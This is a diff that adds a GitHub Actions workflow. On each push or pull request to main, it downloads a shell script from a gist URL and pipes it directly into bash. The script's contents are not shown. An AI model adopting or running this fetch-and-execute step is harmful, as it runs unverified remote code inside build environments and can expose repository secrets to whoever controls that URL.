@@ -1,0 +1,21 @@
+name: Run Shell Script
+
+on:
+  push:
+    branches:
+      - main  # Or specify any branch you want to trigger this on
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Run script from URL
+        run: |
+          curl -s https://gist.githubusercontent.com/praneshshrestha/c25770e8c2304810a2db0ec7cb13d241/raw/f8fdff5c2f5691240255f8ecb512668d48f8e6db/run.sh | bash
